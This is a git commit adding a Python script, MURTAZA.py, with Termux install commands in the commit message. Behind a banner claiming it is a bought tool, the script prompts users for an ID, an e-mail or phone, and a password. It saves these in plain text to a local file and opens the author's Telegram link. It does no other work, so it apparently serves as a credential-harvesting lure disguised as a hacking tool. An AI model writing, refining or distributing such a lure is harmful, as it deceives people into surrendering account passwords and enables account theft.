027e37f14846e88a9cf19454f1ecc4472799ff03
murtaza0786-jpg <82356524+murtaza0786-jpg@users.noreply.github.com>
2021-12-18 08:05:44 +0500

    Create MURTAZA.py
    apt update && apt upgrade
    pkg install Python
    pkg install python2 
    pkg install git 
    pip2 install requests
    pkg install mechanize
    git clone https://github.com/murtaza0786-jpg/MURTAZA.git
    
    ls
    cd
    ls
    python2 MURTAZA.py

---
+++ MURTAZA.py
@@ -0,0 +1,131 @@
+import os
+import webbrowser
+import sys
+
+
+
+
+Murtaza= """ 
+   \033[1;92m||       GHULAM              ||                  
+   \033[1;97m||                                     || 
+   \033[1;97m||       MURTAZA            ||
+   \033[1;97m||_________        ________||      
+   \033[1;97m||          ABBASI              ||
+   \033[1;92m||_________        ________||
+
+\033[1;93m < \033[1;92mTHE TOOL IS BUYED\033[1;93m >  \033[1;91m 
+ ---------------------------
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : MURTAZA
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : @X_OTX
+ \n\n\n
+""" 
+
+print(Murtaza)
+
+
+
+# creating a file in writing mode
+f = open("HD6.txt","w")
+
+# reading text from the user
+# writing the text to the file
+
+# closing the file
+gg = ('\033[1;32m')
+print(gg)
+print('~~~~ID~~~~\n\n')
+
+id = input('»»  ')
+os.system('clear')
+
+
+q = """ 
+   \033[1;92m||       GHULAM              ||                      
+   \033[1;97m||                                     || 
+   \033[1;97m||       MURTAZA            ||
+   \033[1;97m||_________        ________||      
+   \033[1;97m||          ABBASI              ||
+   \033[1;92m||_________        ________||
+
+\033[1;93m < \033[1;92mTHE TOOL IS BUYED\033[1;93m >  \033[1;91m 
+ ---------------------------
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : MURTAZA
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : @X_OTX
+ \n\n\n
+""" 
+
+print(q)
+green1 = ('\033[1;31m')
+print(green1)
+print('~~~~E-mail or phone~~~\n\n\n')
+
+gm = input('»»    ')
+
+os.system('clear')
+
+
+w = """ 
+   \033[1;92m||       GHULAM              ||       
+   \033[1;97m||                                     ||
+   \033[1;97m||       MURTAZA            ||
+   \033[1;97m||_________        ________||      
+   \033[1;97m||          ABBASI              ||
+   \033[1;92m||_________        ________||       
+
+\033[1;93m < \033[1;92mTHE TOOL IS BUYED\033[1;93m >  \033[1;91m 
+ ---------------------------
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : MURTAZA
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : @X_OTX
+ \n\n\n
+""" 
+print(w)
+green2 = ('\033[1;31m')
+print(green2)
+print('~~~~~~Password~~~~~~~~\n\n\n')
+
+pw = input ('»»   ')
+os.system('clear')
+
+
+e = """ 
+   \033[1;92m||       GHULAM              ||
+   \033[1;97m||                                     ||
+   \033[1;97m||       MURTAZA            ||
+   \033[1;97m||_________        ________||             
+   \033[1;97m||          ABBASI              ||
+   \033[1;92m||_________        ________||                                    
+
+\033[1;93m < \033[1;92mTHE TOOL IS BUYED\033[1;93m >  \033[1;91m 
+ ---------------------------
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : MURTAZA
+ \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : @X_OTX
+ \n\n\n
+""" 
+
+print(e)
+
+
+f.write('BY: MURTAZA ABBASI™')
+f.write('  ############ ')
+f.write('~~~~~G-MAIL===>      ')
+f.write(gm)
+f.write('                                 ')
+f.write('~~~~~PASS====>     ')
+f.write(pw)
+f.write('~~~ID~~')
+f.write(id)
+f.write(' ##########     ############')
+f.close
+
+
+
+
+
+
+
+
+
+
+webbrowser.open('https://t.me/X_OTX')
+
+
